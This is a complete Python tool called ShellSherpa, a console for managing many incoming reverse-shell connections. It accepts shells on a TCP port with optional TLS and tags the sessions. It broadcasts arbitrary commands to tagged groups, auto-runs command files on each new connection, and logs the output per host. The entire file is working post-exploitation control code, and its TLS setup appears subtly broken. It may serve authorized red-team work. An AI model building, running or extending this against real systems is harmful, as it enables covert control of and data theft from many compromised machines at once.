#!/usr/bin/env python3

import cmd
import argparse
import asyncio
import threading
import queue
import string
import random
import datetime
from prettytable import PrettyTable
import shlex
from pathlib import Path
import os
import copy

default_tag = None
autoruns = {}

def generate_uuid():
    alphabet = string.ascii_lowercase + string.digits
    return ''.join(random.choices(alphabet, k=8))

def generate_timestamp():
    return '{:%Y%m%d%H%M%S}'.format(datetime.datetime.now())

async def tcp_listener(port, ssl):
    ssl_context = None
    if ssl:
        import ssl
        ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_context.load_cert_chain(ssl[0], ssl[1])

    loop = asyncio.get_running_loop()
    server = await loop.create_server(RevShellProtocol, '0.0.0.0', port, ssl=ssl_context)

    async with server:
        try:
            await server.serve_forever()
        except KeyboardInterrupt:
            return

class RevShellProtocol(asyncio.Protocol):
    
    def __init__(self):
        self._buffer = bytearray()
        super().__init__()

    def connection_made(self, transport):
        peername = transport.get_extra_info('peername')
        print('Connection: {}'.format(peername))
        client = Client(peername[0], self)
        self.client = client
        self.transport = transport

        self.send_queue = queue.Queue()
        self.cur_message = None

        self.client.run_autos()

    def connection_lost(self, err):
        global clients
        print("Disconnect: {}".format(self.client.addr))
        clients.remove_client(self.client)

    def data_received(self, data):
        
        self._buffer += data
        if len(self._buffer) == 0:
            return

        self.cur_message.results = data.decode()
        self.client.process_response(self.cur_message)

        try:
            next_message = self.send_queue.get_nowait()
            self.cur_message = next_message
            self.client.protocol.transport.write(self.cur_message.encoded_command())
        except queue.Empty:
            self.cur_message = None

class Message():

    def __init__(self, command, job_name = None):
        self.command = command
        self.timestamp = generate_timestamp()
        self.results = None
        if job_name:
            self.job_name = job_name
        else:
            self.job_name = command.split()[0]
        
    def get_fullname(self):
        return self.job_name + "." + self.timestamp

    def encoded_command(self):
        return self.command.encode() + b'\x0a'

    def create_outfile(self, directory):
        Path(directory).mkdir(parents=True, exist_ok=True)
        with open(directory + os.path.sep + self.get_fullname() + ".out", 'w+') as f:
            f.write(self.results)

class ClientPool():

    def __init__(self):
        self.clients_lock = threading.Lock()
        self.clients = []

    def add_client(self, client: 'Client'):
        self.clients_lock.acquire()

        self.clients.append(client)

        self.clients_lock.release()

    def remove_client(self, client: 'Client'):
        self.clients_lock.acquire()
        
        client.shutdown()
        self.clients.remove(client)

        self.clients_lock.release()

    def get_tags(self):
        tags_dict = {}
        for c in self.clients:
            for ctag in c.tags:
                if ctag in tags_dict:
                    tags_dict[ctag] = tags_dict[ctag] + 1
                else:
                    tags_dict[ctag] = 1
        return tags_dict

    def remove_clients_by_tag(self, tag):
        for c in self.find_clients_by_tag(tag):
            self.remove_client(c)

    def get_clients_by_tag(self, tag):            
        return self.find_clients_by_tag(tag)
    
    def find_clients_by_tag(self, tag):
        tag = tag.strip('"\'')
        if tag == '*':
            found_clients = self.clients
        else:
            found_clients = [c for c in self.clients if tag in c.tags]

        return found_clients

    def send_message_by_tag(self, tag, message):

        for c in self.find_clients_by_tag(tag):
            c.send(copy.copy(message))

class Client:

    def __init__(self, addr, protocol):
        self.keep_alive = True
        self.uuid = generate_uuid()
        self.addr = addr
        self.protocol = protocol

        self.tags = [self.uuid, self.addr] # first tags are the uuid and ip

        global clients
        clients.add_client(self)

        # allows controller to set a global default tag for all new connections
        global default_tag
        if default_tag is not None:
            self.tags.append(default_tag)

    def run_autos(self):
        global autoruns
        commands_to_run = []
        for tag in self.tags:
            commands_to_run += autoruns.get(tag, [])

        for cmd in commands_to_run:
            self.send(Message(cmd))

    def shutdown(self):
        self.keep_alive = False
        # relies on the async handler to shutdown

    def add_tag(self, tag):
        # no doubles
        if tag not in self.tags:
            self.tags.append(tag)

    def remove_tag(self, tag):
        # can only remove existing tags, but not uuid or addr
        if tag in self.tags and tag != self.uuid and tag != self.addr:
            self.tags.remove(tag)

    def send(self, message):
        if self.protocol.cur_message is not None:
        #if not self.protocol.send_queue.empty():
            self.protocol.send_queue.put(message)
        else:
            self.protocol.cur_message = message
            self.protocol.transport.write(message.encoded_command())

    def client_directory(self, out_dir):

        path = "{}_{}".format(self.addr, self.uuid)
        if out_dir is not None:
            path = out_dir + os.path.sep + path

        return path

    def process_response(self, message: 'Message'):
        global out_dir

        if out_dir is None:
            print("[{} - {}]: {}\n {}".format(self.uuid, self.addr, message.get_fullname() ,message.results))
        else:
            message.create_outfile(self.client_directory(out_dir))

class ShellSherpa(cmd.Cmd):
    intro = '-+- ShellSherpa -+-\n'
    prompt = '> '

    def __init__(self, client_pool):
        super().__init__()
        self.clients = client_pool
        global clients
        clients = client_pool

    def emptyline(self):
        return

    def do_run(self, arg):
        """
        Run a command based on a tag:

            run [tag] [cmd]
        
        """
        parsed_args = list(shlex.shlex(arg))
        tag = parsed_args[0]
        new_msg = Message(' '.join(parsed_args[1:]))
        self.clients.send_message_by_tag(tag, new_msg)

    def do_settag(self, arg):
        """
        Tag to add by default on new callback (besides the IP unique tag):
        
            settag [tag]
        
        """
        global default_tag
        tag = list(shlex.shlex(arg))[0]
        if len(tag) == 0:
            default_tag = None
            self.prompt = '> '
        else:
            default_tag = tag
            self.prompt = default_tag + '> '

    def do_addtag(self, arg):
        """
        Add a tag to things with a given tag (since tag is the only way to lookup uniquely:
        
            addtag [search_tag] [new_tag]

        """
        split_args = list(shlex.shlex(arg))
        if(len(split_args) != 2):
            print("[-] Must provide 2 arguments. Search tag, and new tag")
            return

        search_tag = split_args[0]
        tag_to_add = split_args[1]

        for c in self.clients.find_clients_by_tag(search_tag):
            c.add_tag(tag_to_add)

    def do_settagautos(self, arg):
        """
        Set the autos to run for a given tag:

            settagautos [tag] [file]

            settagautos [tag] none

        """
        split_args = list(shlex.shlex(arg))
        if(len(split_args) != 2):
            print("[-] Must provide 2 arguments. tag and valid file")
            return

        tag = split_args[0].strip("\"'")
        autoruns_file = split_args[1].strip("\"'")
        global autoruns

        if autoruns_file == "none":
            autoruns[tag] = []
        else:
            try:
                with open(autoruns_file, 'r') as f:
                    autoruns[tag] = f.readlines()
            except Exception as e:
                print("[-] Issue with provided file: {}".format(e))

    def do_tags(self, arg):
        """
        List out tags + count:
        
            tags

        """
        tags_dict = self.clients.get_tags()

        x = PrettyTable()
        x.field_names = ["Tag", "Count"]

        for tag_key in sorted(tags_dict, key=tags_dict.__getitem__, reverse=True):
            x.add_row([tag_key, tags_dict[tag_key]])

        print(x)

    def do_sessions(self, arg): 
        """
        List out actual sessions and their tags
        
            sessions

            OR

            sessions [tag]
        
        """
        parsed_args = list(shlex.shlex(arg))

        if len(parsed_args) > 0:
            tag = parsed_args[0]
            clients = self.clients.get_clients_by_tag(tag)
        else:
            clients = self.clients.clients

        x = PrettyTable()
        x.field_names = ["Session UUID", "IP", "Tags"]

        for c in clients:
            x.add_row([c.uuid, c.addr, ', '.join(c.tags)])

        print(x)

    def do_removetag(self, arg):
        """
        Remove a tag similarly as adding
        
            removetag [search_tag] [tag_to_remove]
        
        """
        split_args = list(shlex.shlex(arg))
        if(len(split_args) != 2):
            print("[-] Must provide 2 arguments. Search tag, and tag to remove")
            return

        search_tag = split_args[0]
        tag_to_remove = split_args[1]

        for c in self.clients.find_clients_by_tag(search_tag):
            c.remove_tag(tag_to_remove)

    def do_disconnect(self, arg):
        """
        Disconnect clients by tag:

            disconnect [tag]

        """
        tag = list(shlex.shlex(arg))[0]
        self.clients.remove_clients_by_tag(tag)

    def do_exit(self, arg):
        """
        Exits
        """
        self.clients.remove_clients_by_tag('*')
        return True


def start_server(port, ssl):
    asyncio.run(tcp_listener(port, ssl))

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='Manage shells')
    parser.add_argument('port', type=int, help='Port to listen on.')
    parser.add_argument('--out', type=str, help="Directory where to put output")
    parser.add_argument('--pem', type=str, help="Required to make it SSL. Path of PEM file")
    parser.add_argument('--key', type=str, help="Required to make it SSL. Path of key file.")

    args = parser.parse_args()

    ssl = None
    if args.pem and args.key:
        ssl = (args.pem, args.key)

    thread = threading.Thread(target = start_server, args = (args.port,ssl,))
    thread.start()

    global out_dir
    if args.out:
        out_dir = args.out
    else:
        out_dir = None

    global clients
    clients = ClientPool()

    try:
        ShellSherpa(clients).cmdloop()
    except KeyboardInterrupt:
        pass
